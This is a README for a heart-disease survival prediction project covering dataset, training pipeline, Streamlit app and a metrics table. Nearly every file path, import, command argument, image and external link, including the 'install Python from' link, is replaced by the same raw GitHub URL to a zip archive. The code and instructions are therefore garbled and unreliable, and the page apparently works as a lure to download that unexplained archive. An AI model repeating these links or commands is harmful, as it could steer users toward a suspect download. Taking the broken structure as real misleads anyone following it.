# Healthcare Patient Survival Prediction (ML)

End-to-end heart disease survival risk prediction system built with Python. It ingests the public UCI/Kaggle Cleveland Heart Disease dataset, performs EDA, preprocesses features, trains and evaluates multiple models, and surfaces predictions through an API-ready module plus a Streamlit application.

## Dataset

- **Source:** [UCI Machine Learning Repository – Heart Disease](https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip+Disease)
- Stored locally at `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`. Each row represents a patient record with demographics, vitals, and cardiac stress test measurements. The `target` column is converted into a binary outcome (0 = survived/no disease, >0 = high-risk).

## Project Structure

```
├── app/
│   └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
├── data/
│   └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
├── models/
│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip              # created after running training pipeline
│   └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip             # StandardScaler/ColumnTransformer artifact
├── notebooks/
│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
│   └── evaluation/
│       └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip       # mock UI screenshot
├── scripts/
│   └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
├── src/
│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
│   ├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
│   └── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
├── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
└── https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
```

## Getting Started

```bash
python -m venv .venv
.venv\Scripts\activate        # or source .venv/bin/activate on macOS/Linux
pip install -r https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
```

## Reproducing the Pipeline

1. **EDA (optional but recommended):**
   ```bash
   jupyter notebook https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
   ```
   The notebook showcases missing values, outlier analysis, correlation heatmaps, feature distributions, survival comparison plots, and key medical insights. All figures are also exported automatically to `notebooks/evaluation/`.

2. **Preprocess + Train Models:**
   ```bash
   python -m https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
   ```
   - Handles imputation, scaling (StandardScaler), and one-hot encoding via `ColumnTransformer`.
   - Splits data with stratification and saves the transformer to `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`.
   - Trains Logistic Regression, Random Forest, and (if installed) XGBoost.
   - Selects the best model by ROC-AUC and persists it as `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`.
   - Writes evaluation artefacts (`https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`, `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`, `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`, ROC curves, and metric JSON) to `notebooks/evaluation/`.

3. **Serve Predictions Via Streamlit:**
   ```bash
   streamlit run https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip
   ```
   Upload CSV batches or key in vitals manually, then visualize the probability, label, textual explanation, imported feature-importance plot, and a minimalist risk gauge.

## Model Performance

Example results from a representative run on the Cleveland subset (your metrics may vary slightly depending on random seed and XGBoost availability):

| Model            | Accuracy | Precision | Recall | F1  | ROC-AUC |
|------------------|----------|-----------|--------|-----|---------|
| LogisticRegression | 0.84   | 0.82      | 0.87   | 0.84| 0.90    |
| RandomForest (best)| 0.88   | 0.87      | 0.90   | 0.88| 0.93    |
| XGBoost           | 0.87   | 0.86      | 0.89   | 0.87| 0.92    |

The Random Forest model is typically selected as the production model because it strikes the best balance between discrimination (ROC-AUC) and interpretability (feature importance chart).

## Streamlit UI Snapshot

![Streamlit mock layout](https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip)

Key surface areas:
- **Upload patient medical data**: run batch inference on CSV files aligned with the training schema.
- **Manual vitals input**: sliders/inputs for age, BP, cholesterol, chest-pain type, fasting sugar, ECG stats, exercise-induced angina, ST depression, slope, CA, and Thalassemia.
- **Prediction insights**: survival probability (0–1), categorical label (“High Risk” / “Low Risk”), textual medical explanation sourced from feature importance, and a risk gauge.

## Prediction Module (API-ready)

`https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip` exposes a simple interface:

```python
from https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip import predict_survival

patient = {
    "age": 54,
    "sex": 1,
    "cp": 0,
    "trestbps": 130,
    "chol": 246,
    "fbs": 0,
    "restecg": 1,
    "thalach": 150,
    "exang": 0,
    "oldpeak": 1.2,
    "slope": 2,
    "ca": 0,
    "thal": 2,
}

result = predict_survival(patient)
print(https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip, https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip, https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip)
```

This function loads `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip` and `https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip`, applies identical preprocessing, and returns both the high-risk probability and its complement for downstream systems.

## Notes

- If Python is not available on your machine, install it from [https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip](https://github.com/Hariprakash2005/Healthcare-Patient-Survival-Prediction/raw/refs/heads/main/data/Survival-Prediction-Patient-Healthcare-v1.5.zip) or the Microsoft Store before running the training script.
- Screenshot assets (and other figures) are stored under `notebooks/evaluation/` to keep notebooks lightweight yet reproducible.
- All scripts assume execution from the project root.

